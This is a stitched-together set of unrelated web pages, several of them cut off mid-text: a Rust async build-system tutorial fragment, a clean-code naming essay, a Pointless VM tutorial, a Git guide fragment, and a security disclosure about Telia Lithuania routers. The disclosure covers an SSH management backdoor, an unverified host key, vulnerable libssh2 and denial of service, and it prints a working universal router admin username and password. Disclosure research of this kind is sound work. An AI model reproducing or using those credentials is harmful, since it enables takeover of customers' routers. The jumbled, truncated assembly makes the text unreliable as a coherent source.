</span><span>    </span>local_set.block_on(<span>&amp;</span><span>mut</span><span> </span>runtime,<span> </span>async<span> </span>{<span>
</span><span>    	</span><span>// actual code goes here.
</span><span></span><span>    </span>});<span>
</span><span></span>}<span>
</span></code></pre></div>

<p>We are ready to demo a pretend build system.</p>

<div><pre><code data-lang="rust"><span>// Goes in the "actual code goes here".
</span><span></span><span>let</span><span> </span>compile1<span> </span><span>=</span><span> </span>command<span>!</span>(<span>"sleep 1 &amp;&amp; echo foo.o"</span>);<span>
</span><span></span><span>let</span><span> </span>compile2<span> </span><span>=</span><span> </span>command<span>!</span>(<span>"sleep 2 &amp;&amp; echo bar.o"</span>);<span>
</span><span></span><span>let</span><span> </span>link<span> </span><span>=</span><span> </span>join_all(vec<span>!</span>[compile1,<span> </span>compile2]).then(<span>|</span>_<span>|</span><span> </span>command<span>!</span>(<span>"sleep 1 &amp;&amp; echo baz.so"</span>));<span>
</span><span>
</span><span></span><span>let</span><span> </span><span>mut</span><span> </span>targets<span> </span><span>=</span><span> </span>FuturesUnordered::new();<span>
</span><span></span>targets.push(link);<span>
</span><span>
</span><span></span><span>while</span><span> </span><span>let</span><span> </span><span>Some</span>(_)<span> </span><span>=</span><span> </span>targets.next().await<span> </span>{}<span>
</span></code></pre></div>

<p>We pretend to compile 2 object files, which can happen in parallel. Then we build a shared library that requires both these files. <code>FuturesUnordered</code> allows waiting on a set of futures, and treating them as a stream of results. Each call to <code>next().await</code> will block until one of the futures in the set is done, and then will return the value of that future. This allows us to simulate a build system that has multiple “top-level” keys (files) being built.</p>

<p>Running this will produce something like <sup id="fnref:2"><a href="#fn:2">2</a></sup>:</p>

<div><pre><code data-lang="text">Starting 'sleep 1 &amp;&amp; echo foo.o'
Starting 'sleep 2 &amp;&amp; echo bar.o'
foo.o
Done 'sleep 1 &amp;&amp; echo foo.o'
bar.o
Done 'sleep 2 &amp;&amp; echo bar.o'
Starting 'sleep 1 &amp;&amp; echo baz.so'
baz.so
Done 'sleep 1 &amp;&amp; echo baz.so'</code></pre></div>

<p>demonstrating that the 2 compiles start roughly at the same time (not blocking on each other) and the link does not start until they are both done.</p>

<p>Why is this a suspending scheduler? Well, the “build system” is requested to run the task <code>baz.so</code>. This task is represented by a Future returned from <code>join_all(...).then()</code>. Internally this generates a state machine that is going to wait on all the futures in the join. This is analogous to discovering that certain dependencies need to be built. <code>join_all</code> then suspends itself. It signals to the runtime that it cannot continue until these other tasks are done, so it shouldn’t be woken up until they are. The dependencies are now “present in the system” <sup id="fnref:5"><a href="#fn:5">3</a></sup>, and they get run to completion. Once they are done, the task resumes from the yield point and finishes itself!</p>

<p>A corollary of this is that the runtime will try to run as many futures (tasks) as it can. Try it! Time to make sure we don’t overload machines.</p>

<h2 id="constraining-parallelism">Constraining parallelism</h2>

<p><a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=93943d4bf6c87f2315f9b440b1e5ebcd">Full code in the Rust playground</a></p>

<p>How would we impose a limit on how many tasks are running at the same time? Instead of just suspending until a task’s dependencies are ready, we could have the task stay suspended until we had the capacity to run it. We could imagine modeling this as a device that maintains some kind of shared counter. The counter has a maximum value. Each Future obtained from such a device would only be ready when there was capacity in the system. It would decrement the counter and return some handle which the task can use to indicate when it has finished running. That will increment the counter.</p>

<p>This sounds very much like a <a href="https://en.wikipedia.org/wiki/Semaphore_(programming)">semaphore</a> from thread-based parallelism. Indeed, tokio does provide a <a href="https://docs.rs/tokio/0.2.21/tokio/sync/struct.Semaphore.html"><code>Semaphore</code></a> that behaves exactly like this. It also uses some Rust idioms to make it …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Multiple vulnerabilities could allow running arbitrary code on an intranet server and gain root access on all the customers' routers</p>

<p>Telia is a Swedish multinational telecommunications company. It also operates in Lithuania and provides mobile service, FTTH internet, DSL internet and IPTV. Telia rents and sells custom routers and set-top tv boxes to customers which have limited or almost no administration access left to them.</p>

<p>Every Telia router or tv box has a backdoor or "management interface". It is an <code>SSH</code> server running on VLAN 5 and/or WAN. Usually, it is running on port <code>8022</code>. Older models, like <code>ADB</code>, have password login enabled. The recent newer models, like <code>Technicolor</code>, have password login disabled and only use ssh with public key authentication (spoiler: it is still vulnerable).</p>

<p>Savitarna (in Lithuanian "Self service") - is a web service <a href="https://www.telia.lt/mano/sso">https://www.telia.lt/mano/sso</a> that allows Telia customers to order and manage services, get invoices, pay bills etc. It uses password authentication or external authority logins such as Facebook, Google, banking, digital signature etc. One of the new features: changing your router's wifi password. Sounds interesting, right? An internet web service that is able to change your local router's wifi password.</p>
<p>Login page:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-login.jpg" alt="Telia Savitarna web login page"></p>
<p>Change wifi settings:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-wifi-settings.jpg" alt="Telia Savitarna WiFi setting change feature"></p>

<p>How that works. When a user wants to change the password, the web service calls the backend to initiate an SSH connection to the user's associated router. Depending on the router it will be either password authentication or RSA public key. After a successful login a PHP script on the backend will issue some commands in the router's shell, parse the result and output some of the data to the user in the web UI, like wireless network name. <strong>Telia knows your WIFI password in plain text</strong>, keep it in mind and do not reuse this password anywhere. Overall scheme:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-scheme.jpg" alt="Overall scheme of Telia backdoor"></p>

<p>Let's take a look at how the SSH connection is established. Network capture shows an SSH client banner and the remote IP that initiated the connection:</p>
<p><code>SSH-2.0-libssh2_1.4.2 PHP 10.0.98.251</code></p>
<p>What is important here:</p>
<ul>
<li>Vulnerable <code>libssh2</code> version <code>1.4.2</code> <a href="https://www.libssh2.org/security.html">https://www.libssh2.org/security.html</a></li>
<li>Weak and deprecated key exchange <code>diffie-hellman-group1-sha1</code></li>
<li>The client does not verify <code>remote SSH server public key</code> (see below)</li>
<li><code>PHP</code></li>
</ul>
<p>And, yes, it turns out that Telia's client does not attempt to verify the remote server's public key. We were able to start a custom SSH server on the same port 8022 and Savitarna successfully established a connection without even trying to verify for a man-in-the-middle. This means that we can see the password used and could try to create a malicious SSH server that exploits public vulnerabilities on Telia's side.</p>

<p>That was an easy task. As soon as Telia's client connected to our malicious SSH server we got the universal router credentials:</p>
<pre>User: tadmin
Password: hqMV8Wps
</pre>

<p>Do you still own an ADB router? Just go ahead and login over the web interface with this user. You are now an admin. You can do some restricted stuff now, great! But what about the root shell? We were able to connect with those credentials locally and got a limited shell. That's nice too. This gave us a lot of additional information that was hidden inside the router, many more vulnerabilities. Using one of them we were able to escalate to root and got full access over the device. The newer models like Technicolor require some additional exploits chained to gain full root access, but all are publicly available and so - easily doable.</p>

<p>In order to exploit RCE we needed to build a virtual test environment that fully copies Telia's PHP client. Step by step we have gone through the sequence of Telia's commands sent over the SSH. And finally we got a malicious SSH server and a test libssh2 client running in our test lab. With this server we could fully control the protocol and start fuzzing.</p>
<p>In the first few days of the fuzzing we got some crashes and partially confirmed that RCE may be exploited. Here is a sample GIF video that demonstrates two kinds of the issues the fuzzer found for us. Same php file was executed twice, but the malicious SSH server sent different payloads which caused:</p>
<ul>
<li>Segfault (stack corruption)</li>
<li>Infinite loop with high CPU</li>
</ul>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-poc.gif" alt="GIF PoC video"></p>
<p>However, at the time of the report we couldn't find an easy way to exploit the stack corruption. It may require more time, longer and more sophisticated fuzzing and more knowledge about the server. As Lithuanian law prohibits exploit testing on the real server, we could only fingerprint the Windows OS, but nothing more.</p>

<p>The backend seems to run only 5 php processes, so it is fairly easy to perform DoS by keeping stalled ssh connections. When SSH connections stay active for too long filling all the 5 php processes (there seems to be no timeout reading the remote shell), the Savitarna will show a strange "Maintenance" message:</p>
<p>Translation:</p>
<pre>An update is in progress
Too many of you are trying to access the new Telia webpage.
We are expanding the resources and will accept you all soon.
Apologies for any inconvenience
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-DoS.jpg" alt="Service unavailbale"></p>

<p>If we now get all together, an attacker could exploit RCE on the intranet server and use that server to move laterally (because <code>10.0.98.251</code> is whitelisted everywhere) across all the customer routers with the same credentials creating the most powerful, persistent and undetectable botnet of Lithuania. Who knows, maybe someone already exploited that? (spoiler: see bonus section)</p>

<p>The report was responsibly disclosed to Telia and a copy sent to <code>CERT LT</code> (<a href="https://www.nksc.lt/">NKSC</a>). What happened next was a little bit of a surprise to the team. There were rumours previously about Telia's poor tech level, but we have experienced this in a real case.</p>
<p>First, Telia did not have a PGP key and did not know how to use it, so instead they asked us to ZIP the report with password and send the password over a separate email (private GMail). I hope Telia's engineers will be reading this article, so I would like to explain why the report should be encrypted. This is to protect you as the affected vendor. If there is a man in the middle who can intercept all the researcher's traffic, it will be very easy to get the ZIP file in the first email and then the password in the second email. Instead, PKI like PGP only allows to decrypt the report by the private key owner, ensuring that nobody else can intercept the report and exploit the vulnerabilities before you fix them all. </p>
<p>Second, Telia tried to threaten the reporter for the vulnerability discovery:</p>
<p>Translation:</p>
<pre>Thank you for the information
Are you sure you did not violate the electronic data protection law?
</pre>

<p>Original:</p>

<p>And then they once again mentioned that they will check if this report wasn't a hacking attempt and that they will persecute any reporter that discloses any information about Telia vulnerabilities:</p>
<p>Translation:</p>
<pre>Thank you for the information. We will continue to check whether you made your report
legally without violating any law. And we will ensure that no fake information will be
published that could do any harm to the company's reputation and to the critical part
of Lithuanian network infrastructure.
</pre>

<p>Original:</p>
<pre>Dėkojame Jums už pasidalintą informaciją, kurios surinkimo teisėtumo vertinimą toliau
atliekame ir tikimės, kad į viešumą nebus paskleista tikrovės neatitinkanti ar neteisėtai

<p>We will not comment on this and let the IT community to judge. At the same time we will no longer provide any reports in any form to Telia company.</p>

<p>* Note: partial fix for KEX means the new KEX is not considered to be weak, however it is now possible to exploit libssh2 vulnerabilities after 1.8.0 with this particular KEX and a publicly known exploit for <a href="https://github.com/Semmle/SecurityExploits/blob/446048470633bf0f8da9570d008d056dbaa28ea9/libssh2/out_of_bounds_read_kex_CVE-2019-13115/server/home/diff.txt">KexAlgorithms diffie-hellman-group-exchange-sha256</a></p>

<p>After getting the root access and analyzing the Telia's routers' firmwares, we found several more users, like <code>ladmin</code> and <code>technician</code>. We will not disclose those passwords (yet), as it is not clear yet how both are used. But we were surprised that Telia's passwords appeared to be leaked many years ago. You can try to search for the tadmin password's hash on the web and you will be surprised - there was an attempt to crack the hash back in 2014!</p>

<p>And finally, we found that the hash was cracked and was available in the old "weakpass" database. You can search for the "old" weakpass database (sometimes named "First version of weakpass") and grep it - password is there. This means that most probably we are not the first who were able to penetrate Telia.</p>

<blockquote><p>“He’s perhaps one of two dozen people who knows the name of Iron.”</p><cite>Kvothe, <a rel="noreferrer noopener" href="https://amzn.to/2Y6Te0T" target="_blank">Name of the Wind</a>, The Kingkiller Chronicles</cite></blockquote>



<p>Names have power. Patrick Rothfuss adeptly harnesses this truth in his excellent novel series The Kingkiller Chronicles. In the word of Temerant, knowing the true name of an element such an Iron or Wind gives someone supernatural control of it.</p>



<p>The power of names is demonstrated through a simple photograph of place signs. Each of the words on the wall above conjures a feeling of excitement, or curiosity, or perhaps a distant memory, fleeting and poignant.</p>



<p>What we choose to call events, concepts and people measurably changes our view of them. The names we given ourselves quietly in our hearts have enormous influence over our mental state.</p>



<p>Astonishingly, recent research has discovered that we even <a aria-label="undefined (opens in a new tab)" href="https://www.apa.org/pubs/journals/releases/psp-pspa0000076.pdf" target="_blank" rel="noreferrer noopener">look like our given names</a>. Researchers have shown that people and computers can infer our name by looking at our face, an effect demonstrable beyond socioeconomic cues. Therefore, our facial appearance represents social expectations of how a person with a specific name should look.</p>



<h2>The importance of naming for clean code</h2>



<p>This a significant realisation for our mental health and well-being, but how does it fit with delivering clean code faster?</p>



<p>Names communicate. They have the power to tell others what a thing is and does. That reduces friction in our development teams, and allows us to understand code faster and deliver more quickly.</p>



<p>Why should we expend so much effort to get them right? Because the name of a concept gives us insight into how it fits into the system we are designing. Conversely, if we’re not careful with naming, we’ll be producing <a aria-label="undefined (opens in a new tab)" href="http://www.catb.org/jargon/html/W/write-only-code.html" target="_blank" rel="noreferrer noopener">write-only code</a> which drifts apart from the whole, lost and destined for eventual deletion.</p>



<p>Here are some principles you can use to help you choose the best names and produce clean code with less effort. We’ll start with the nuts and bolt of naming code, then move to how to determine meaningful names in conjunction with our customers.</p>



<h2>Intentionally move through the four stages of naming</h2>



<blockquote><p><em>There are two hard problems in computer science: Cache invalidation, naming things, and off by one errors.”</em></p><cite><a href="http://martinfowler.com/bliki/TwoHardThings.html" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Martin Fowler</a></cite></blockquote>



<p>How should we pay attention to names as we get started with coding something new? J.B. Rainsberger&nbsp;<a aria-label="undefined (opens in a new tab)" href="http://www.jbrains.ca/permalink/the-four-elements-of-simple-design" target="_blank" rel="noreferrer noopener">talks about</a>&nbsp;names of classes, methods and variables going through four stages towards clean code:</p>



<ul><li><em>Nonsense:</em>&nbsp;For example, we might extract a method from a larger one and quickly rename it&nbsp;<code>somethingWhatever()</code>&nbsp;to get the refactor done and the tests passing.</li><li><em>Accurate:</em>&nbsp;We rename the nonsense method to what it actually does, such as&nbsp;<code>processPayroll()</code>.</li><li><em>Precise:</em>&nbsp;Once we realise what the method really does, we might refine the accurate name and give it more precision, such as&nbsp;<code>loopThroughEmployeesAndPayThem()</code>.</li><li><em>Meaningful:</em>&nbsp;At this point, we’ve revealed the complexity of the method, and can look to split it up into two methods:&nbsp;<code>forEachEmployee()</code>&nbsp;and perhaps a&nbsp;<code>payWages()</code>&nbsp;method on a separate interface.</li></ul>



<h2>Don’t be afraid of nonsense or longer names</h2>



<p>We shouldn’t shy away from the early stages of naming. If we’re not sure what something is yet, give it a nonsense name. The name&nbsp;<code>foo()</code>&nbsp;is fine, as long as it’s only going to last fifteen minutes.</p>



<p>It doesn’t belong in a commit, and it’s not clean code, but it’s a start. It gets our code moving so we can begin to see how our concepts fit together.</p>



<p>As you progress, some concepts or ideas will outgrow your abstractions. They become ripe for future refactoring. If in doubt as to what or where something fits, use a long name: the longer and more precise the better. I will call a variable something like <code>computed_unsorted_project_task_matrix</code>&nbsp;if I don’t like it and want to refactor it at some point.</p>



<p>This is much more intention revealing than&nbsp;<code>result</code>&nbsp;(or&nbsp;<code>res</code>,&nbsp;or&nbsp;<code>r</code>). I reveal the complexity of the object through the name, which helps reveal complexity in the code.</p>



<h2>Characters are cheap</h2>



<p>Let’s not make things harder for the programmers who come after us. Remember, this is just as likely to be ourselves in a few months. Let’s avoid using a name like&nbsp;<code>p</code>&nbsp;when&nbsp;<code>project</code>&nbsp;is only a few characters more.</p>



<p>Anything that reduces reading friction in our code is a good thing.</p>



<p>This isn’t fashionable amongst developers in certain languages communities like Clojure or Haskell. They prefer brevity in variable names, relying on convention for understanding. For example, <code>k</code> and <code>v</code> often refer to <code>key</code> and <code>value</code> in a Clojure Map.</p>



<p>The important thing is to reduce friction in the team. If your team are used to these variables, it’ll be quick to understand: for them, it’ll be clean code. However, this will increase the barrier to other team members. In general I prefer longer more meaningful names to this. I don’t think it’s worth sacrificing the team’s understanding for the sake of a few characters. If names are becoming so cumbersome their length is reducing clarity, this shows the need for a refactor.</p>



<h2>Name concepts for your customer, not yourself</h2>



<p>Along the steps we take through to making names more precise and meaningful, how do we choose what words to use for the concepts we’re dealing with? We name these concepts through continual conversations with customers.</p>



<p>Ubiquitous language is an excellent concept and tool that Eric Evans introduced years ago in the book <a href="https://amzn.to/3ftKZBF">Domain Driven Design</a>. Every coder would do well to read at least the first half of this book. The idea is often taught within a Behaviour Driven Development context, but it is logically independent. Any agile team can work towards a Ubiquitous Language.</p>



<p>The central idea is that there are two languages that we can use to talk about a concept: the “problem” language or the “solution” language. The problem language is the language of the customer. For example, a payroll system might use concepts like <em>wages, salary, PAYE, tax, paying.</em> The solution language is the language of developmers. For example we might use the following names for the code that runs the payroll system: <em>button, element, value, collection, style, parent-child, container, object.</em></p>



<p>The solution language is where many programmers naturally live, think and speak. It’s easy for us to operate with these kinds of concepts. The trouble is, they’re often alien for our customer. Instead of lazily reaching for <code>parent</code>–<code>child</code> (or the more problematic <code>master</code>–<code>slave</code> vernacular) when describing a concept, let’s instead collaborate with our customers on a shared language that works well for everyone. Perhaps we <em>add an employee to a tax band</em> rather than <em>insert a user into a collection</em>, both <a href="https://deliverydoubled.com/deliver-faster-boost-teamwork-a-simple-guide-to-development-focus/" target="_blank" rel="noreferrer noopener">when discussing the next feature</a>, and when we’re writing the code itself.</p>



<h2>Intentional conversations reduce confusion and produce clean code</h2>



<p>It’s common for teams to have to deal with concepts and words that overlap and interact with each other. Single concepts are called different things by different people on the team. Different groups of people within an organisation use the same word for wholly different ideas.</p>



<p>It’s such a universal problem people often don’t pay attention to it. However confusion and cognitive load will build up and cause communication problems over time.</p>



<p>It’s also fairly easy to solve this problem through having quick, regular, intentional conversations.</p>



<p>Next time you’re discussing a concept with your team that’s poorly named, speak up. Ask whether there’s another name for the concept that could reduce confusion. Try a few different words or phrases out with the team until you settle on the right thing. This might mean inventing entirely new words or concepts that fit well with everyone in the team. That’s ok, as long as it makes our language more precise.</p>



<p>Once a word has been decided on, commit to using it everywhere from now on. Deliberately take the time to update the names in the code to match.</p>



<p>Perhaps you could volunteer to maintain a glossary of words so that everyone feels the benefit. Newer team members are often great people to keep an eye on these documents, and update them whenever they encounter errors.</p>



<p>There’s always going to be a barrier for incoming team members new to our code and our concepts. If we’re having these intentional conversations, we’re helping newer people by creating a smaller set of names for them to learn.</p>



<hr>



<p>Names have power. They can drive insight and influence communication. Let’s intentionally practice our naming as a team, so that everyone has a say about the language and terminology we use. Let’s build those names right into our codebases, moving through the stages towards the team’s language as the code becomes clearer. This will harmonise the team’s work, make for cleaner code, and puts the team on the right track to improving their delivery times.</p>

      <h3>Tutorial: Writing a VM for a Small Stack-Base Language in Pointless</h3>
      <pre>- Avery N. Nortonsmith</pre>

      <hr>

      <p>
        The age of functional programming will soon be over.
      </p>

      <p>
        Object-oriented programming has come and gone. Functional programming -- the wise, quiet observer -- has waited patiently for its turn. But FP, like OOP, will fade away in time as software yields to the inexorable pull of the one <em>True Paradigm</em>: stack-based programming!
      </p>

      <hr>

      <p>
        Joking aside, stack-based programming <em>is</em> pretty cool.
      </p>

      <p>
        This tutorial covers the implementation of a <strong>virtual-machine</strong> for a small, <strong>stack-based</strong> language in Pointless. We'll take an <strong>incremental</strong> approach to building the VM and improving its capabilities until it can run a short <strong>prime-factorization</strong> program.
      </p>

      This project seeks to demonstrate:

      <ul>
        <li>
          How an imperative language can be implemented in a purely functional context
        </li>

        <li>
          How to structure and refactor code that uses persistent data-structures
        </li>

        <li>
          How Pointless can -- even as a young language -- be used to solve non-trivial tasks
        </li>
      </ul>

      <p>
        Before we tackle prime-factorization, let's take a look at a small example of the stack-based code that our VM will evaluate. The following Pointless code defines a <a href="https://ptls.dev/docs.html#lists">list</a> of 'instructions', where <a href="https://ptls.dev/docs.html#tuples">labeled-tuples</a> are used to represent instructions with an argument, and <a href="https://ptls.dev/docs.html#labels">labels</a> are used for those without. A list of instructions like this represents a program in our stack-based language:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        Let's take a minute to fancy things up by writing a function to pretty-print these instruction lists -- this will come in handy later when we work with more complex programs. The function <code>showInst</code> below takes an instruction and returns a string showing the instruction's type (left-justified to 5 characters) and argument. The function <code>argOrBlank</code> returns an instruction's argument if there is one, or an empty string otherwise. 
      </p>

      <div>
        <pre>showInst(inst) =
 format("[ {&lt;5} ] {}", [getLabel(inst), argOrBlank(inst)])

argOrBlank(inst) =
  if is(PtlsTuple, inst) then unwrap(inst) else ""
</pre>
      </div>

      <p>
        In the code above, <code><a href="https://ptls.dev/api/prelude/format.html#format">format</a></code>, <code><a href="https://ptls.dev/api/prelude/label.html#getLabel">getLabel</a></code>, <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code>, and <code><a href="https://ptls.dev/api/prelude/label.html#unwrap">unwrap</a></code> are defined in the Pointless <a href="https://ptls.dev/api/index.html">prelude</a> (standard-library).
      </p>

      <p>
        To see our new functions in action, we'll define an output variable for our program; in Pointless, a program's output is defined by its output variable. The prelude contains functions like <code><a href="https://ptls.dev/api/prelude/io.html#printLines">printLines</a></code> which generate sequences of IO commands that can be assigned to a program's output variable.
      </p>

      <p>
        The output definition below takes our list of instructions, generates a new list of instruction-strings by calling <code>showInst</code> on each instruction, and produces IO commands to print each string on a separate line. Take a look at the docs for more info on the function <a href="https://ptls.dev/docs.html#pipeOperator">pipe operator</a> <code>|&gt;</code>, and for <a href="https://ptls.dev/docs.html#partialApplication">partial application</a>.
      </p>

      <p><em>
        Note that the name 'main.ptls' is chosen arbitrarily; it doesn't have any special meaning
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; map(showInst)
  |&gt; printLines
</pre>

      <pre>$ ./bin/pointless main.ptls

[ Const ] 7
[ Const ] 2
[ Mod   ] 
[ Const ] 0
[ Eq    ] 
[ Print ] 
[ Exit  ]
</pre>
      </div>

      <p>Seeing is believing. Time to start making our VM.</p>

      <p>
        We'll represent the VM as an <a href="https://ptls.dev/docs.html#objects">object</a> with the following fields:
      </p>

      <ul>
        <li><code>slots</code>: used to store "heap" variables (discussed later on)</li>
        <li><code>insts</code>: an array containing the program's instructions</li>
        <li><code>index</code>: the position in instruction array of the current instruction</li>
        <li><code>stack</code>: a linked-list serving as the stack for the VM</li>
        <li><code>outVal</code>: used to get output from VM as program runs</li>
      </ul>

      <p>
        The function <code>vmFromInsts</code> sets up a new VM object for a given list of instructions. The code also adds the label <code>VM</code> to the VM object (objects and tuples can be labeled in Pointless). Object labels can be used to write code that tells different types of objects apart, or simply for documentation (as we do here).
      </p>

      <div>
        <pre>vmFromInsts(program) = VM {
  slots  = zeroArray(8)
  insts  = toArray(program)
  index  = 0
  stack  = []
  outVal = None
}
</pre>
      </div>

      <p>
        To check that <code>vmFromInsts</code> works, we'll modify our output definition to create and print a new VM object. Note that we've replaced <code>printLines</code> with <code><a href="https://ptls.dev/api/prelude/io.html#println">println</a></code> -- <code>printLines</code> expects a sequence of values (and can print these values on-the-fly as they're computed in the case of lists!), whereas <code>println</code> can handle sequence and non-sequences types.
      </p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = []; insts = [Const(7) Const(2) Mod Const(0) Eq Print Exit]; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        We run the program, and see that <code>println</code> gives us a nice visualization of our initial VM object, fields and all.
      </p>

      <p>
        Back to our list of instructions:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        The instructions above do the following -- (once we've implemented them, that is):
      </p>

      <ul>
        <li><code>Const(arg)</code> pushes <code>arg</code> onto the VM stack</li>
        <li><code>Mod</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 % v0</code></li>
        <li><code>Eq</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 == v0</code></li>
        <li><code>Print</code> pops a value from the stack and prints it</li>
        <li><code>Exit</code> signals the end of the program</li>
      </ul>

      <p>
        Additionally, each of these instructions will advance the VM to the next instruction after performing the behaviors above. Nice and imperative ;)
      </p>

      <p>
        With this in mind, we see that the program above does the following: loads the values <code>7</code> and <code>2</code> onto the stack, computes <code>7 % 2</code>, loads the value <code>0</code>, compares <code>0</code> with the result of <code>7 % 2</code>, prints the result of this comparison, and exits. In other words, this program tells us whether or not <code>7</code> is even.
      </p>

      <p>
        Now that we've defined some instructions, let's start evaluating them.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, vm.insts[vm.index])
    vm with $.stack = [unwrap(vm.insts[vm.index])] ++ vm.stack
}
</pre>
      </div>

      <p>
        Our <code>eval</code> function uses a <code><a href="https://ptls.dev/docs.html#cond">cond</a></code> conditional -- eventually this will include cases for all instructions, but we'll start with just <code>Const</code> for now. The code above calls the function <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code> to check whether the current instruction has the label <code>Const</code> (where the current instruction is the instruction in the <code>vm.insts</code> array at index <code>vm.index</code>). If <code>is</code> returns true, then conditional evaluates and returns the body of the case expression.
      </p>

      <p>
        Structures in Pointless persistent, and thus immutable. As such, our program will never mutate the state of a VM object; rather, it will produce new VM objects. The code above uses <a href="https://ptls.dev/docs.html#viaWith">with syntax</a> (which can handle both shallow and nested updates -- one of Pointless's little innovations) to create a new VM object with a new stack value: the old stack with the instruction argument pushed to the top. The <code>unwrap</code> function is used to get the argument from the <code>Const</code> instruction.
      </p>

      <p>
        The code above is dense and repetitive! We can improve it by defining a couple of variables. In the new version, <code>inst</code> is the current instruction, and the <code>arg</code> is the argument of that instruction.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm with $.stack = [arg] ++ vm.stack

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>
      </div>

      <p>
        We modify the program's output definition to call <code>eval</code> on the VM to evaluate the first instruction, <code>Const(7)</code>. Looking at output, we see that the value <code>7</code> has been pushed to the stack.
      </p>

      <p><em>
        <code>insts</code> field abbreviated for readability
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        But wait! We need our <code>Const</code> handler to do one more thing -- advance the VM to the next instruction. To do this, we'll make a new helper function <code>advance</code> that takes a VM object and returns a new VM object with the instruction index incremented. We'll also move the code for pushing a value onto the VM stack into the new function <code>pushVal</code>.
      </p>

      <div>
        <pre>advance(vm) = vm with $.index += 1

pushVal(arg, vm) = vm with $.stack = [arg] ++ vm.stack
</pre>
      </div>

      <p>
        Using these two new functions, the code for <code>eval</code> becomes:
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm
    |&gt; pushVal(arg)
    |&gt; advance

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 1; outVal = None}
</pre>
      </div>

      <p>
        We call the program again and get the result seen above: the new VM object returned by <code>eval</code> has the value <code>7</code> on its stack and its index incremented.
      </p>

      <p>
        At this point, the entire program looks something like this:
      </p>

      <p><em>
        Note that the comment bars are not necessary, but are helpful for dividing code visually -- it's a habit of mine, like using fake em-dashes. They can also be used to mark API documentation
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println

program = [

Although the command line may be more intimidating for new developers, it also is far more powerful and you will need to learn it since most GUIs offer limited commands.</p><p>Git commands typically take the form of <code>git &lt;command&gt; &lt;args&gt;</code> where <code>&lt;args&gt;</code> might be a file path. Commands may also have <em>options</em> specified denoted by a <code>--&lt;option&gt;</code> or a <code>-&lt;single-letter-option&gt;</code> - think of these as adding extra details as to what the command should do. In this guide, I will present the general syntax and you should replace anything in <code>&lt;&gt;</code> with your corresponding value.</p><p>If you are uncertain about the usage of a command, a really useful command is:
<code>git help &lt;command&gt;</code>
which brings up the manual, or for a refresher <code>git &lt;command&gt; -h</code> or <code>git &lt;command&gt; --help</code> (<code>--help</code> and <code>-h</code> are equivalent).</p><h2 id="setting-up-git"><a href="#setting-up-git" aria-label="setting up git permalink"></a>Setting up Git</h2><h3 id="installing-git"><a href="#installing-git" aria-label="installing git permalink"></a>Installing Git</h3><p><strong>Windows</strong>: Head to <a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p><p><strong>MacOS</strong>: Git comes as part of XCode Command Line Tools, so install that. To check if you’ve installed Git already open a Terminal window and type <code>git --version</code> to check which version you have.</p><p><strong>Linux</strong>: Run <code>sudo apt install git-all</code> (Debian-based) in the terminal or <code>sudo dnf install git-all</code> (RPM-based).</p><h3 id="set-up-configuration-file"><a href="#set-up-configuration-file" aria-label="set up configuration file permalink"></a>Set up Configuration File</h3><p>The first thing to do having installed Git is to set up your user name and email address, since these are used to identify you and stored in all snapshots you make. This is stored in a <strong>configuration file</strong> where you store all your preferences.</p><p>You can either edit this <code>.gitconfig</code> file directly using a text editor or <code>git config --global --edit</code> or instead alter specific fields with <code>git config --global &lt;field&gt; &lt;value&gt;</code> - we’re interested in the fields <code>user.name</code> and <code>user.email</code>.</p><p>We can also configure the text editor we use for commits using the field <code>core.editor</code> - initially this is set to the system default editor (e.g vi for Linux/Mac). <code>commit.template &lt;template_file&gt;</code> lets you specify a template that comes up whenever you commit.</p><p>There are many other fields, however one particular field I find especially useful is <code>alias</code> which maps commands to abbreviations: <code>alias.&lt;ab&gt; &lt;command&gt;</code>.
